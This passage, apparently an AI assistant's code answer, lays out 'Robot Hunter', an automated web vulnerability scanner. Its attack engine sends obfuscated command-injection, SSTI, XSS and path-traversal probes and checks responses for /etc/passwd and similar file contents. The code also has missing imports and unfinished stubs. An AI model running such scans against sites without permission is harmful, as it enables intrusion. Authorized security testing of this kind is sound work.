        # Check primarily in HTML content types
        content_type = response.headers.get("content-type", "").lower()
        if "html" not in content_type:
             # Maybe check JSON if marker is found? Less common for classic XSS
             if marker in response.text:
                  return False, f"Marker reflected in non-HTML ({content_type})"
             return False, f"Non-HTML Content ({content_type})"

        body = response.text
        # Simple check: is the exact payload present? (minus the marker logic for simplicity here)
        # A more robust check involves parsing HTML and checking attribute/text node values
        # For <script>alert('marker')</script>, check if "alert('marker')" exists within <script> tags or event handlers
        # For <img src=x onerror=alert('marker')>, check if "onerror=alert('marker')" exists
        simplified_payload_check = payload.replace(f"alert('{marker}')", "").replace(f"`{marker}`", "") # Remove marker part for easier check
        if simplified_payload_check in body:
             # Need to check if it's properly escaped
             # Example: If payload is "<script>...", check if response has "&lt;script&gt;..."
             escaped_payload = html.escape(simplified_payload_check)
             if escaped_payload in body:
                 return False, "Payload Reflected but Escaped"

             # If not escaped, likely vulnerable
             return True, "Payload Reflected Unescaped"

        return False, "Payload Not Found in Response"

    async def test_cmdi(self, url, method, base_params, base_data, field):
        vuln_type = "CMDi"
        test_key = self._get_test_key(method, url, field, vuln_type)
        if self._was_tested(test_key): return
        self._mark_tested(test_key)

        self.console.print_info(f"Testing Command Injection on: {method} {url} (Field: {field})")
        original_value = base_params.get(field, base_data.get(field, ''))
        sleep_time = 8 # Longer sleep for CMDi typically

        async def run_check(payload_category, check_payloads, verification_func, verification_desc):
             for payload_template in check_payloads:
                  payload = payload_template # Assume template is usable directly for error/boolean
                  if "SLEEP_TIME" in payload_template:
                      payload = payload_template.replace("SLEEP_TIME", str(sleep_time))
                  elif "INTERACTSH_URL" in payload_template:
                      if not self.interactsh_url: continue
                      payload = payload_template.replace("INTERACTSH_URL", self.interactsh_url)

                  obfuscated_payload = self.detector.obfuscate_payload(payload, level=random.randint(0, 1)) # Less obfuscation initially
                  test_val = str(original_value) + obfuscated_payload

                  current_params = base_params.copy(); current_data = base_data.copy()
                  if field in current_params: current_params[field] = test_val
                  if field in current_data: current_data[field] = test_val

                  start_time = time.time()
                  response = await self._make_request(url, method, params=current_params, data=current_data, payload_info=f"CMDi-{payload_category}")
                  duration = time.time() - start_time

                  if response is not None:
                      is_vuln, details = verification_func(response, duration, sleep_time)
                      self.console.print_attack_attempt(url, method, f"CMDi-{payload_category}", test_val, response.status_code, len(response.content), is_vuln, verification_desc)
                      if is_vuln:
                          self.record_finding(f"command_injection_{payload_category.lower()}", "CRITICAL", {
                              "field": field, "payload_used": payload, "obfuscated_payload": obfuscated_payload,
                              "test_value": test_val, "verification": f"{verification_desc} ({details})"
                          }, url)
                          return True
             return False

        # Run checks (Time based is most common for blind)
        if await run_check("time", CMD_PAYLOADS['blind_time'], self._verify_cmdi_time, f"Time Delay >{sleep_time}s"): return
        # Add OOB check
        # Add error/output check (less common for blind)
        # if await run_check("output", CMD_PAYLOADS['basic'], self._verify_cmdi_output, "Command Output"): return

    def _verify_cmdi_time(self, response: httpx.Response, duration, sleep_time) -> (bool, str):
        # Similar to SQLi time verification, maybe slightly more lenient lower bound
        lower_bound = sleep_time * 0.85
        is_delayed = duration >= lower_bound
        return is_delayed, f"Duration={duration:.2f}s"

    # Add _verify_cmdi_oob using interactsh client library if integrated
    # Add _verify_cmdi_output checking for common command outputs (like uid=0, NT AUTHORITY\SYSTEM, directory listing etc.)


    async def test_ssti(self, url, method, base_params, base_data, field):
        vuln_type = "SSTI"
        test_key = self._get_test_key(method, url, field, vuln_type)
        if self._was_tested(test_key): return
        self._mark_tested(test_key)

        self.console.print_info(f"Testing SSTI on: {method} {url} (Field: {field})")
        original_value = base_params.get(field, base_data.get(field, ''))
        test_val_base = 49 # 7*7

        async def run_check(payload_category, check_payloads, verification_func, verification_desc):
            payloads_to_test = check_payloads
            if isinstance(check_payloads, dict): # Handle nested dict like code_execution
                 payloads_to_test = [p for sublist in check_payloads.values() for p in sublist]

            for payload_template in payloads_to_test:
                 payload = payload_template # Basic detection often doesn't need modification
                 if "INTERACTSH_URL" in payload_template: # For OOB checks
                     if not self.interactsh_url: continue
                     payload = payload_template.replace("INTERACTSH_URL", self.interactsh_url)

                 # SSTI payloads are sensitive, minimal obfuscation usually best
                 obfuscated_payload = self.detector.obfuscate_payload(payload, level=0) # Try level 0 first
                 test_val = str(original_value) + obfuscated_payload

                 current_params = base_params.copy(); current_data = base_data.copy()
                 if field in current_params: current_params[field] = test_val
                 if field in current_data: current_data[field] = test_val

                 response = await self._make_request(url, method, params=current_params, data=current_data, payload_info=f"SSTI-{payload_category}")

                 if response:
                     is_vuln, details = verification_func(response, str(test_val_base), payload_template)
                     self.console.print_attack_attempt(url, method, f"SSTI-{payload_category}", test_val, response.status_code, len(response.content), is_vuln, verification_desc)
                     if is_vuln:
                         self.record_finding(f"ssti_{payload_category.lower()}", "CRITICAL", {
                             "field": field, "payload_used": payload, "test_value": test_val,
                             "verification": f"{verification_desc} ({details})"
                         }, url)
                         return True # Found one
            return False

        # Run checks
        if await run_check("detection", SSTI_PAYLOADS['basic_detection'], self._verify_ssti_calc, f"Calculation Result ({test_val_base})"): return
        # Add checks for common_vars exposure
        # Add checks for specific template engine errors
        # Add checks for code_execution (carefully, maybe OOB first)

    def _verify_ssti_calc(self, response: httpx.Response, expected_result: str, payload_template: str) -> (bool, str):
        """Checks if the expected calculation result (e.g., '49') is in the response."""
        if not response: return False, "No Response"
        body = response.text
        # Check if the exact result string is present, excluding the payload itself
        if expected_result in body and payload_template not in body:
             # Basic check, could be more robust by checking near the injection point if possible
             return True, f"Found '{expected_result}' in response"
        return False, f"Result '{expected_result}' not found"

    async def test_path_traversal(self, url, method):
        """Tests for Path Traversal LFI/RFI."""
        # Path traversal often targets specific parameters, but can sometimes be in the path itself
        # This basic version tests appending payloads to the URL path if no parameters exist
        # A more robust version would identify file-inclusion parameters first.

        vuln_type = "PathTraversal"
        test_key = self._get_test_key(method, url, "__PATH__", vuln_type) # Use special param name for path
        if self._was_tested(test_key): return
        self._mark_tested(test_key)

        self.console.print_info(f"Testing Path Traversal on URL Path: {method} {url}")
        parsed_url = urlparse(url)
        base_path = parsed_url.path

        # Combine all path traversal payloads
        all_payloads = [p for cat in PATH_TRAVERSAL_PAYLOADS.values() for p in cat]

        for payload in all_payloads:
             # Append payload to the base path or replace last segment? Append is simpler.
             # Need careful joining logic
             test_path = urljoin(base_path + "/", payload) # Append payload relative to current path
             test_url = parsed_url._replace(path=test_path).geturl()

             obfuscated_payload_path = self.detector.obfuscate_payload(test_path, level=random.randint(0,1)) # Minimal obfuscation for paths
             test_url_obfuscated = parsed_url._replace(path=obfuscated_payload_path).geturl()


             response = await self._make_request(test_url_obfuscated, method, payload_info="PathTrav")

             if response:
                 is_vuln, details = self._verify_path_traversal(response)
                 self.console.print_attack_attempt(test_url_obfuscated, method, "PathTrav", payload, response.status_code, len(response.content), is_vuln, "File Content/Error")
                 if is_vuln:
                     self.record_finding("path_traversal", "HIGH", {
                         "payload_used": payload,
                         "tested_path": obfuscated_payload_path,
                         "verification": f"Sensitive Content/Error ({details})"
                     }, url) # Report original URL for context
                     return # Found one

    def _verify_path_traversal(self, response: httpx.Response) -> (bool, str):
        """Checks response for indicators of successful path traversal."""
        if not response: return False, "No Response"

        # Check for sensitive content patterns first
        text = response.text
        sensitive_content = {
            "root:x:0:0": "/etc/passwd content",
            "boot.ini": "Windows boot config",
            "[fonts]": "Windows win.ini content",
            "DOCUMENT_ROOT": "PHP Info / Environ",
            "java.lang.Runtime": "Java Error/Stack Trace",
            "#!/bin/bash": "Shell script content",
            "<?php": "PHP source code",
            "Microsoft Windows": "Windows system info",
            "Linux": "Linux system info (e.g., /proc/version)",
        }
        for pattern, description in sensitive_content.items():
            if pattern in text:
                return True, f"Found '{description}'"

        # Check for common file inclusion errors (if status code isn't 200)
        if response.status_code != 200:
            errors = [
                "failed to open stream", "include(", "require(", "file_get_contents(",
                "no such file or directory", "failed opening required", "cannot access",
                "system cannot find the file", "could not find the file",
            ]
            text_lower = text.lower()
            for err in errors:
                if err in text_lower:
                    return True, f"Detected Error: '{err}'" # Potential LFI even if file not found

        return False, "No Clear Indicator Found"

    def get_findings(self):
        return self.findings
```

---

**6. `site_crawler.py` (Refactored - Integration Snippets)**

```python
import random
import asyncio
from typing import Set, Dict, List, Optional
from urllib.parse import urljoin, urlparse, parse_qs
import playwright.async_api as pw
from datetime import datetime
import time

# Import refactored/new components
from console_manager import ConsoleManager
from smart_detector import SmartDetector
from attack_engine import AttackEngine
from advanced_js_analyzer import AdvancedJSAnalyzer # Assuming this exists and is updated
from js_analyzer import JSAnalyzer # Static analyzer
from traffic_analyzer import TrafficAnalyzer # Playwright based
from report_generator import ReportGenerator

class SmartCrawler:
    # --- Init with dependencies ---
    def __init__(self, console_manager: ConsoleManager, report_generator: ReportGenerator, max_depth: int = 2, rate_limit: int = 10, interactsh_url: Optional[str] = None):
        self.console = console_manager
        self.report_generator = report_generator
        self.max_depth = max_depth
        self.rate_limit_delay = 1.0 / rate_limit if rate_limit > 0 else 0
        self.interactsh_url = interactsh_url

        self.visited_urls: Set[str] = set()
        self.scope_domain: Optional[str] = None

        # Initialize components
        self.detector = SmartDetector(self.console, interactsh_url=self.interactsh_url)
        self.attack_engine = AttackEngine(self.console, self.detector, interactsh_url=self.interactsh_url)
        self.js_static_analyzer = JSAnalyzer() # Keep this simple
        self.js_dynamic_analyzer = AdvancedJSAnalyzer(self.console) # Pass console
        self.traffic_analyzer = TrafficAnalyzer(self.console) # Pass console

        # Crawler state
        self.crawl_queue = asyncio.Queue()
        self.active_tasks = set()

        # Search terms (keep as is or move to config/payloads.py)
        self.search_terms = { ... }
        self.used_terms: Set[str] = set()
        self.searches_per_page = 1 # Limit searches

        self.console.print_info("SmartCrawler initialized.")

    # --- Core Crawl Logic ---
    async def start_crawl(self, initial_url: str):
        self.scope_domain = urlparse(initial_url).netloc
        if not self.scope_domain:
            self.console.print_error(f"Invalid initial URL: {initial_url}", fatal=True)

        self.console.print_info(f"Scope set to domain: {self.scope_domain}")
        await self.crawl_queue.put((initial_url, 0)) # URL, depth
        self.visited_urls.add(self._normalize_url(initial_url))

        async with pw.async_playwright() as p:
            browser = await p.chromium.launch(headless=True) # Consider headless=False for debugging
            context = await browser.new_context(
                user_agent=await self.detector.get_next_user_agent_and_headers()['User-Agent'], # Initial UA
                ignore_https_errors=True, # Often needed for test environments
                viewport={'width': 1280, 'height': 800} # Common viewport
            )
            # Setup traffic analysis hooks
            await self.traffic_analyzer.capture_traffic(context) # Attach to context

            page = await context.new_page()

            # Main loop
            while not self.crawl_queue.empty():
                url, depth = await self.crawl_queue.get()
                if depth > self.max_depth:
                    self.console.print_debug(f"Max depth reached for {url}. Skipping.")
                    continue

                task = asyncio.create_task(self.crawl_page(page, url, depth))
                self.active_tasks.add(task)
                task.add_done_callback(self.active_tasks.discard)

                await asyncio.sleep(self.rate_limit_delay) # Basic rate limiting

                # Optional: Limit concurrent crawls if needed
                # if len(self.active_tasks) >= MAX_CONCURRENT_CRAWLS:
                #    _done, self.active_tasks = await asyncio.wait(self.active_tasks, return_when=asyncio.FIRST_COMPLETED)

            # Wait for any remaining tasks
            if self.active_tasks:
                await asyncio.wait(self.active_tasks)

            self.console.print_info("Crawl queue empty. Finishing up...")
            await self.attack_engine.close_client() # Close httpx client
            await browser.close()

            # Add final findings to report
            self.report_generator.add_findings("attack_engine", self.attack_engine.get_findings())
            self.report_generator.add_findings("traffic_analysis", self.traffic_analyzer.analyze_traffic())
            # Add findings from JS analyzers if they store them internally


    async def crawl_page(self, page: pw.Page, url: str, depth: int):
        self.console.print_info(f"Crawling [Depth:{depth}]: {url}")
        try:
            # 1. Navigate
            response = await page.goto(url, wait_until="domcontentloaded", timeout=30000) # Faster timeout, maybe networkidle later
            if response is None:
                 self.console.print_warning(f"Navigation failed for {url} (no response)")
                 return
            if response.status >= 400:
                 self.console.print_warning(f"Initial navigation status {response.status} for {url}")
                 if response.status == 403:
                     # Use attack engine's httpx client for bypass attempt
                     await self.attack_engine.handle_forbidden(url)
                 # Don't necessarily stop crawling on error, page might still render some links/js
                 # return # Optional: stop on non-2xx/3xx

            await page.wait_for_timeout(1500) # Allow dynamic content to potentially load after DOMContentLoaded

            # 2. Initial Analysis (Static JS, Traffic already captured)
            # Static JS - Run quickly
            scripts_content = await self.js_static_analyzer.extract_js_content(page) # New method needed in JSAnalyzer
            static_findings = []
            for script_url, script_code in scripts_content.items():
                 if script_code:
                     beautified = self.js_static_analyzer.deobfuscate_js(script_code)
                     findings = self.js_static_analyzer.find_suspicious_patterns(beautified)
                     if findings:
                          self.console.print_info(f"Found {len(findings)} static JS findings in {script_url or 'inline script'}")
                          for finding in findings:
                               self.console.print_finding(f"js_static_{finding['type']}", "LOW", finding, script_url or url) # Adjust severity
                               static_findings.append(finding)
            self.report_generator.add_findings("js_static", static_findings)


            # 3. Dynamic JS Analysis (Advanced)
            adv_js_findings = await self.js_dynamic_analyzer.run_full_analysis(page) # Assuming this returns findings
            if adv_js_findings and adv_js_findings.get("findings"):
                self.console.print_info(f"Found {len(adv_js_findings['findings'])} dynamic JS findings on {url}")
                self.report_generator.add_findings("js_dynamic", adv_js_findings["findings"])
                # Print findings immediately via console manager within AdvancedJSAnalyzer

            # 4. Basic Vulnerability Checks on current URL/Params
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            # Convert parse_qs output to simple dict (first value per param)
            simple_params = {k: v[0] for k, v in query_params.items()}
            await self.attack_engine.test_vulnerability(url, "GET", params=simple_params)

            # 5. Discover Interactive Elements & Forms
            interactive_elements = await self.detector.detect_interactive_elements(page)
            forms = await self.detector.detect_forms(page)

            # 6. Interact (Click Elements, Submit Forms) - Limit interactions per page
            interaction_limit = 5
            interactions_done = 0

            # Click some high-score elements
            for element_data in interactive_elements:
                if interactions_done >= interaction_limit: break
                try:
                     selector = element_data['selector']
                     self.console.print_debug(f"Attempting to click: {element_data['tag']} '{element_data['text']}' (Selector: {selector[:50]}...)")
                     element = await page.query_selector(selector)
                     if element and await element.is_visible():
                         # TODO: Capture state before/after click for analysis if needed
                         await element.click(timeout=5000) # Short timeout for clicks
                         await page.wait_for_load_state("networkidle", timeout=10000) # Wait after click
                         interactions_done += 1
                         # Re-analyze JS? Or just rely on traffic capture? Re-analyzing is heavy.
                         # Maybe run basic vuln scan on new URL if it changed?
                         new_url = page.url
                         if self._normalize_url(new_url) != self._normalize_url(url):
                              self.console.print_info(f"URL changed after click to: {new_url}")
                              if self._is_in_scope(new_url) and self._normalize_url(new_url) not in self.visited_urls:
                                   await self.add_to_crawl_queue(new_url, depth + 1) # Add new URL from interaction

                 except Exception as e:
                     self.console.print_warning(f"Error clicking element {element_data.get('selector', 'N/A')}: {e}")
                 await asyncio.sleep(self.rate_limit_delay / 2) # Small delay between interactions

            # Submit some forms with test data
            for form_data in forms:
                 if interactions_done >= interaction_limit: break
                 try:
                      self.console.print_debug(f"Attempting to test form (Type: {form_data['type']})")
                      # TODO: Implement smart form filling and submission in AttackEngine or here
                      # e.g., fill with basic data, trigger attack_engine.test_vulnerability for form action/method/params
                      # await self.handle_form_submission(page, form_data) # Need this method
                      interactions_done += 1
                 except Exception as e:
                      self.console.print_warning(f"Error submitting form: {e}")
                 await asyncio.sleep(self.rate_limit_delay / 2)

             # Perform a limited number of searches
             # await self.handle_search_forms(page) # Need this method adapted

            # 7. Gather New Links
            links = await self.gather_links(page, url)
            self.console.print_info(f"Found {len(links)} potential links on {url}")
            for link in links:
                if self._is_in_scope(link):
                     await self.add_to_crawl_queue(link, depth + 1)

        except pw.TimeoutError:
            self.console.print_warning(f"Page navigation timed out: {url}")
        except Exception as e:
            self.console.print_error(f"Error crawling {url}: {e}")
            import traceback
            self.console.print_debug(traceback.format_exc()) # Print stack trace if verbose

    def _normalize_url(self, url: str) -> str:
        """Normalizes URL to avoid duplicate crawls (e.g., remove fragment, sort params)."""
        try:
            parsed = urlparse(url)
            # Sort query parameters
            query_params = sorted(parse_qs(parsed.query).items())
            # Rebuild query string consistently
            sorted_query = urllib.parse.urlencode(query_params, doseq=True)
            # Rebuild URL without fragment, with sorted query
            normalized = parsed._replace(query=sorted_query, fragment="").geturl()
            return normalized
        except Exception:
            return url # Fallback if parsing fails


    def _is_in_scope(self, url: str) -> bool:
        """Checks if a URL belongs to the target domain."""
        try:
            return urlparse(url).netloc == self.scope_domain
        except Exception:
            return False

    async def add_to_crawl_queue(self, url: str, depth: int):
        """Adds a URL to the queue if it's in scope and not visited."""
        normalized_url = self._normalize_url(url)
        if self._is_in_scope(url) and normalized_url not in self.visited_urls:
            self.visited_urls.add(normalized_url)
            await self.crawl_queue.put((url, depth)) # Add original URL to queue
            self.console.print_debug(f"Added to queue [Depth:{depth}]: {url}")

    async def gather_links(self, page: pw.Page, base_url: str) -> List[str]:
        """Gathers all valid, in-scope links from the page."""
        links = set()
        try:
            hrefs = await page.eval_on_selector_all('a[href]', 'elements => elements.map(el => el.href)')
            srcs = await page.eval_on_selector_all('[src]', 'elements => elements.map(el => el.src)')
            # Add other potential sources like form actions

            for link in hrefs + srcs:
                if link and isinstance(link, str):
                     try:
                         full_url = urljoin(base_url, link.strip())
                         # Basic filter: only http/https, ignore mailto, javascript:, etc.
                         if full_url.startswith('http'):
                             links.add(full_url)
                     except Exception:
                         continue # Ignore malformed URLs
        except Exception as e:
            self.console.print_warning(f"Error gathering links on {base_url}: {e}")
        return list(links)

    def get_findings(self):
         # Consolidate findings from crawler itself if any were stored here
         return [] # Example: return self.crawler_findings

    # Placeholder for missing methods to be implemented
    async def handle_form_submission(self, page: pw.Page, form_data: dict):
         self.console.print_debug(f"Handling form submission for type: {form_data.get('type')}")
         # 1. Identify action URL and method
         # 2. Identify input fields (use selectors from form_data)
         # 3. Fill form with basic valid/invalid data (e.g., test@example.com, password123)
         # 4. Create parameter/data dict based on input names/values
         # 5. Call self.attack_engine.test_vulnerability on the action URL/method with form data
         # 6. If standard form, find submit button (selector from form_data) and click
         # 7. If pseudo-form, find potential submit button and click (more heuristic)
         pass

    async def handle_search_forms(self, page: pw.Page):
         self.console.print_debug("Handling search forms...")
         # 1. Find search input fields (use selectors)
         # 2. Get a search term using self.get_next_search_term()
         # 3. Fill the input, find associated submit button, click
         # 4. Analyze results page (maybe trigger vuln scan on search results URL)
         pass

    async def get_next_search_term(self) -> Optional[str]:
         # Logic to pick a term from self.search_terms, avoiding self.used_terms
         # ... (implementation needed)
         return None # Placeholder
```

---

**7. `report_generator.py` (Refactored)**

```python
import json
from datetime import datetime
import time
from collections import defaultdict
from console_manager import ConsoleManager # Optional: if needed

class ReportGenerator:
    def __init__(self, console_manager: ConsoleManager): # Pass if needed
        self.console = console_manager
        self.findings = defaultdict(list) # Store findings by category {category: [finding1, finding2]}
        self.metadata = {
            "scan_start_time": time.time(),
            "scan_start_iso": datetime.now().isoformat(),
            "scan_end_time": None,
            "scan_end_iso": None,
            "version": "1.1.0", # Updated version
            "scan_target": None,
            "scan_duration_seconds": None,
            "scan_status": "initiated"
        }
        # No lock needed if we add findings sequentially at the end or carefully manage async adds

    def add_findings(self, section: str, findings: List[dict]):
        """Adds a list of findings under a specific section."""
        if findings:
            # Ensure findings have severity if possible (can be done here or earlier)
            processed_findings = [self._ensure_severity(f) for f in findings]
            self.findings[section].extend(processed_findings)
            self.console.print_debug(f"Added {len(findings)} findings to report section '{section}'")

    def _ensure_severity(self, finding: dict) -> dict:
         """Assigns a default severity if missing, based on type."""
         if "severity" not in finding or not finding["severity"]:
              finding["severity"] = self._determine_severity(finding) # Use internal logic
         return finding


    def set_scan_target(self, target: str):
        self.metadata["scan_target"] = target

    def finalize_report(self):
        """Calculates duration and sets status before generating."""
        end_time = time.time()
        self.metadata["scan_end_time"] = end_time
        self.metadata["scan_end_iso"] = datetime.now().isoformat()
        self.metadata["scan_duration_seconds"] = round(end_time - self.metadata["scan_start_time"], 2)
        # Status should be set externally (e.g., completed, interrupted, failed)

    def set_scan_status(self, status: str):
         self.metadata["scan_status"] = status


    def generate_summary(self) -> dict:
        """Generates a summary dictionary from all collected findings."""
        summary = {
            "total_findings": 0,
            "by_severity": defaultdict(int),
            "by_type": defaultdict(int),
            "vulnerable_endpoints": set(), # Use a set for uniqueness
            # Add more summary points if needed
        }

        all_findings_flat = [finding for section_findings in self.findings.values() for finding in section_findings]

        summary["total_findings"] = len(all_findings_flat)

        for finding in all_findings_flat:
            severity = finding.get("severity", "INFO").lower() # Default to INFO
            finding_type = finding.get("type", "unknown")

            summary["by_severity"][severity] += 1
            summary["by_type"][finding_type] += 1

            # Add URL to vulnerable endpoints if present
            url = finding.get("url")
            if url:
                summary["vulnerable_endpoints"].add(url)

        # Convert set back to list for JSON compatibility
        summary["vulnerable_endpoints"] = sorted(list(summary["vulnerable_endpoints"]))
        return summary

    def _determine_severity(self, finding: dict) -> str:
        """Determines severity based on finding type if not explicitly set."""
        # This logic determines default severity if not provided
        # Keep severity determination logic (critical, high, medium, low, info based on type)
        finding_type = finding.get("type", "").lower()

        # Critical Vulnerabilities
        critical_types = [
            "sql_injection", "command_injection", "ssti", "rce", # Base types
            "sql_injection_error", "sql_injection_time", "sql_injection_oob", # SQLi variants
            "command_injection_time", "command_injection_oob", # CMDi variants
            "ssti_code_execution", # Specific SSTI
        ]
        # High Vulnerabilities
        high_types = [
             "xss_reflected", "xss_stored", "path_traversal", "forbidden_bypass", "ssrf",
             "insecure_deserialization", "authentication_bypass", "privilege_escalation",
             "sensitive_data_exposure", # e.g., finding API keys, passwords directly
             "js_dynamic_var_modification_error", # Dynamic JS errors often exploitable
        ]
        # Medium Vulnerabilities
        medium_types = [
             "xss_dom", "open_redirect", "csrf", "information_disclosure", # General info leak
             "directory_listing", "misconfiguration", # e.g., exposed panels, debug modes
             "js_static_sensitive_comments", "js_static_api_keys", # Static findings need context
             "traffic_sensitive_header",
             "js_dynamic_suspicious_call_chain",
             "js_dynamic_service_connection", # Potential internal service exposure
        ]
         # Low Vulnerabilities
        low_types = [
             "http_security_headers_missing", # Like X-Frame-Options, CSP
             "verbose_error_message", # Revealing stack traces, paths
             "software_version_disclosure", # e.g., Server header
             "js_static_endpoints", "js_static_internal_urls", # Need verification
             "traffic_internal_endpoint",
             "js_dynamic_active_single_char_var", # Suspicious but needs context
        ]

        # Check finding type against lists
        for type_prefix in critical_types:
             if finding_type.startswith(type_prefix): return "CRITICAL"
        for type_prefix in high_types:
             if finding_type.startswith(type_prefix): return "HIGH"
        for type_prefix in medium_types:
             if finding_type.startswith(type_prefix): return "MEDIUM"
        for type_prefix in low_types:
             if finding_type.startswith(type_prefix): return "LOW"

        # Default
        return "INFO"


    def generate_report(self, filename_prefix: str):
        """Generates the JSON report file."""
        self.finalize_report() # Ensure duration/status are set

        report_data = {
            "metadata": self.metadata,
            "summary": self.generate_summary(), # Generate summary just before output
            "findings": dict(self.findings) # Convert defaultdict back to dict for JSON
        }

        json_filename = f"{filename_prefix}.json"
        try:
            with open(json_filename, "w", encoding="utf-8") as f:
                json.dump(report_data, f, indent=2, ensure_ascii=False)
            self.console.print_success(f"JSON report saved to: {json_filename}")
        except Exception as e:
            self.console.print_error(f"Failed to write JSON report to {json_filename}: {e}")

```

---

**8. `robot_hunter.py` (Main Entry Point - Updated)**

```python
import argparse
from rich.console import Console
from site_crawler import SmartCrawler
from console_manager import ConsoleManager
from report_generator import ReportGenerator
import asyncio
import time
import logging
import os
import sys

# Configure basic logging for libraries that use it
# logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

def display_banner(console):
    # Banner from previous example
    banner = r"""
██████╗  ██████╗ ██████╗  ██████╗ ████████╗   ██╗   ██╗██╗   ██╗████████╗███████╗██████╗
██╔══██╗██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝   ██║   ██║██║   ██║╚══██╔══╝██╔════╝██╔══██╗
██████╔╝██║   ██║██████╔╝██║   ██║   ██║      ██║   ██║██║   ██║   ██║   ███████╗██████╔╝
██╔══██╗██║   ██║██╔══██╗██║   ██║   ██║      ██║   ██║██║   ██║   ██║   ╚════██║██╔══██╗
██║  ██║╚██████╔╝██████╔╝╚██████╔╝   ██║      ╚██████╔╝╚██████╔╝   ██║   ███████║██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝    ╚═╝       ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
                                Version 1.1.0 - Advanced Web Recon & Analysis
    """
    console.print(f"[bold cyan]{banner}[/bold cyan]\n", highlight=False)

def main():
    # --- Argument Parsing ---
    parser = argparse.ArgumentParser(
        description="Robot Hunter - Advanced Web Reconnaissance and Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter, # Keep formatting
        epilog="Example: python robot_hunter.py https://example.com -d 3 -o report -v --rate-limit 5"
    )
    parser.add_argument("target", help="Target URL (e.g., https://example.com)")
    parser.add_argument("-d", "--depth", type=int, default=2, metavar='N', help="Maximum crawl depth (default: 2)")
    parser.add_argument("-o", "--output", metavar='PREFIX', help="Output file prefix for JSON report")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose debug output")
    parser.add_argument("--no-color", action="store_true", help="Disable colored output")
    parser.add_argument("--rate-limit", type=int, default=10, metavar='RPS', help="Approx. requests per second for crawler (default: 10)")
    parser.add_argument("--timeout", type=int, default=30, metavar='SEC', help="Default navigation/request timeout in seconds (default: 30)")
    parser.add_argument("--interactsh-url", metavar='URL', help="Interactsh server URL for OOB testing (e.g., xyz.oast.me)")
    # Add more flags as needed: --proxy, --headers-file, --cookies-file, --skip-attacks, --attack-aggressiveness, etc.

    # Handle case where no arguments are given
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    # --- Initialization ---
    console_manager = ConsoleManager(verbose=args.verbose, no_color=args.no_color)
    display_banner(console_manager.console) # Use the console instance from ConsoleManager

    # Setup Playwright logging level (optional)
    # os.environ["DEBUG"] = "pw:api" # Very verbose Playwright logs if needed

    console_manager.print_info(f"Target: [bold blue]{args.target}[/bold blue]")
    console_manager.print_info(f"Max Depth: {args.depth}, Rate Limit: ~{args.rate_limit}/s, Timeout: {args.timeout}s")
    if args.output:
        console_manager.print_info(f"Report Prefix: {args.output}")
    if args.interactsh_url:
        console_manager.print_info(f"Interactsh URL: {args.interactsh_url}")
    if args.verbose:
        console_manager.print_debug("Verbose mode enabled.")

    report_generator = ReportGenerator(console_manager)
    report_generator.set_scan_target(args.target)

    # Pass relevant args to crawler/engine
    crawler = SmartCrawler(
        console_manager=console_manager,
        report_generator=report_generator,
        max_depth=args.depth,
        rate_limit=args.rate_limit,
        interactsh_url=args.interactsh_url
        # Pass timeout if needed by crawler components
    )

    start_time = time.time()
    scan_status = "failed" # Default status

    # --- Run Scan ---
    try:
        asyncio.run(crawler.start_crawl(args.target))
        scan_status = "completed" # Set status if crawl finishes without error/interruption
        console_manager.print_success("Scan Crawling Phase Completed.")

    except KeyboardInterrupt:
        console_manager.print_warning("\nScan interrupted by user.")
        scan_status = "interrupted"
    except pw.Error as e:
         console_manager.print_error(f"A Playwright error occurred: {e}", fatal=True)
    except httpx.RequestError as e:
         console_manager.print_error(f"A network request error occurred: {e}", fatal=True)
    except Exception as e:
        console_manager.print_error(f"An unexpected error occurred during scan: {e}", fatal=False) # Don't exit fatally here, try reporting
        import traceback
        console_manager.console.print_exception(show_locals=args.verbose) # Print rich traceback

    finally:
        # --- Reporting Phase ---
        duration = time.time() - start_time
        console_manager.print_info(f"Scan finished in {duration:.2f} seconds.")

        report_generator.set_scan_status(scan_status)

        # Display summary on console
        summary = report_generator.generate_summary()
        console_manager.print_summary(summary)

        # Generate file report if requested
        if args.output:
             report_generator.generate_report(args.output)

        console_manager.print_info("Robot Hunter finished.")


if __name__ == "__main__":
    main()
```

---

**Remaining Files (Minor Changes/Placeholders):**

*   **`advanced_js_analyzer.py`:** Needs `__init__(self, console_manager)` and replace `print`/`logger` with `self.console.print_*`. Ensure `run_full_analysis` returns findings in a structured way. Add `self.console = console_manager`.
*   **`js_analyzer.py`:** Add a method `extract_js_content(self, page)` that gets both inline and external script *content* (fetching external ones). Keep other methods as they are static analysis helpers. Doesn't strictly need `ConsoleManager` if it just returns data.
*   **`traffic_analyzer.py`:** Needs `__init__(self, console_manager)`. Replace `print` with `self.console.print_*`. Ensure `capture_traffic` attaches to the `BrowserContext` instead of a `Page` for wider capture. `analyze_traffic` should return findings. `get_endpoints` is useful. Add `self.console = console_manager`.

---

**To Run:**

1.  Save all the code snippets into their respective `.py` files.
2.  Install dependencies: `pip install -r requirements.txt`
3.  Install Playwright browsers: `playwright install`
4.  Run from your terminal: `python robot_hunter.py https://your-target.com -v -o scan_report` (adjust flags as needed).

This provides a solid, refactored foundation. Remember to implement the `TODO` sections (like form handling, search handling, OOB verification) and thoroughly test against diverse web applications.